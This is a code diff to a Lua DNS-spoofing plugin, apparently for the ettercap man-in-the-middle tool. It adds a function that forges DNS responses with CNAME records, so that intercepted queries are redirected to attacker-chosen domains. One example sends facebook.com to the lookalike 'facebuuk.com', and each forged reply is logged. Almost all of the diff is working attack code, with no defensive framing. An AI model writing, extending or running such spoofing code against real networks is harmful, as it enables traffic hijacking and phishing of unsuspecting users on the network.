@@ -29,6 +29,15 @@ local custom_hosts = {
   ["facebook.com"]     = "127.0.0.2"
   -- add more as needed
 }
+
+local custom_redirects = {
+  ["example2.com"]     = "hunting.com",
+  ["somewhere2.local"] = "fishing.local",
+  ["facebook.com"]     = "facebuuk.com"
+  -- add more as needed
+}
+
+
 -- -----------------------------
 -- END USER CUSTOMIZATION
 -- -----------------------------
@@ -107,6 +116,51 @@ local function build_spoofed_response(transaction_id, qname, custom_ip)
   local rdata = string.char(ip_bytes[1], ip_bytes[2], ip_bytes[3], ip_bytes[4])
 
   return make_header(transaction_id) .. question .. answer .. rdata
+end
+
+local function build_spoofed_response2(transaction_id, qname, redirect_domain)
+  local function encode_domain(dname)
+    local out = {}
+    for label in dname:gmatch("[^%.]+") do
+      table.insert(out, string.char(#label))
+      table.insert(out, label)
+    end
+    table.insert(out, string.char(0)) -- null terminator
+    return table.concat(out)
+  end
+
+  local function make_header(trx_id)
+    local id_hi = math.floor(trx_id / 256)
+    local id_lo = trx_id % 256
+    return string.char(
+      id_hi, id_lo,
+      0x81, 0x80,  -- Flags: response, recursion available, no error
+      0x00, 0x01,  -- QDCOUNT = 1
+      0x00, 0x01,  -- ANCOUNT = 1
+      0x00, 0x00,  -- NSCOUNT
+      0x00, 0x00   -- ARCOUNT
+    )
+  end
+
+  -- encode domain names
+  local encoded_qname = encode_domain(qname)              -- the query name
+  local encoded_cname = encode_domain(redirect_domain)      -- the domain we're redirecting to
+
+  -- Question section: qname + type (A) + class (IN)
+  local question = encoded_qname ..
+                   string.char(0x00, 0x01) ..  -- TYPE A (requested)
+                   string.char(0x00, 0x01)    -- CLASS IN
+
+  -- Answer section:
+  -- NAME: pointer to the original query name (offset 12 = 0x0C)
+  local answer = string.char(0xC0, 0x0C) ..
+                 string.char(0x00, 0x05) ..  -- TYPE CNAME
+                 string.char(0x00, 0x01) ..  -- CLASS IN
+                 string.char(0x00, 0x00, 0x00, 0x3C)  ..  -- TTL = 60s
+                 string.char(0x00, #encoded_cname) ..     -- RDLENGTH = length of cname
+                 encoded_cname                            -- RDATA = encoded cname
+
+  return make_header(transaction_id) .. question .. answer
 end
 ----------------------------------------------------------------------------
 -- parse_dns_name: parse a label-encoded domain name from DNS payload
@@ -238,6 +292,8 @@ action = function(p)
     end
 
     local spoof_ip = custom_hosts[qname]
+	local redirected_domain = custom_redirects[qname]
+	
     if spoof_ip then
       local new_payload = build_spoofed_response(transaction_id, qname, spoof_ip)
       packet.set_data(p, new_payload)
@@ -258,7 +314,27 @@ action = function(p)
         log_file:flush()
       end
       return
-    else
+    elseif redirected_domain then
+	  local new_payload = build_spoofed_response2(transaction_id, qname, redirected_domain)
+      packet.set_data(p, new_payload)
+
+      -- If these functions exist, call them
+      if packet.set_length then
+        packet.set_length(p, #new_payload)
+      end
+      if packet.update_checksums then
+        packet.update_checksums(p)
+      end
+
+      local slog = string.format("[DNS-SPOOF] %s => %s forcibly redirected to %s",
+                                 client_ip, qname, redirected_domain)
+      ettercap.log(slog.."\n")
+      if log_file then
+        log_file:write(slog.."\n")
+        log_file:flush()
+      end
+      return
+	else
       local slog
       if an_count == 0 then
         if rcode == 3 then
